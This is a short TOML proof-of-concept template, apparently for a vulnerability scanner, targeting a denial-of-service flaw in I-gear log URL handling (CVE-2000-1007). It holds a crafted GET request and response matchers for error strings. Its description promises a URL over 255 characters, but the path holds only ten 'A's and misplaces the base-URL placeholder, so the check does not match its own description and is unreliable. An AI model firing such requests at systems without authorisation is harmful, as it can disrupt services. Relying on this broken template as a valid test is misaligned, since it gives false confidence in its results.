[info]
author = "AVE"
description = "向 I-gear 服务器发送包含超长 URL（超过255字符）的 HTTP 请求，触发日志处理缺陷，导致报表系统生成错误数据或日志解析失败"
id = "POC-AVE-2000-1046"
name = "I-gear 日志URL超长处理不当拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1046"]
vuln_id = [
    "CVE-2000-1007",
    "AVE-2000-1046",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AAAAAAAAAA"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "error",
    "Exception",
]
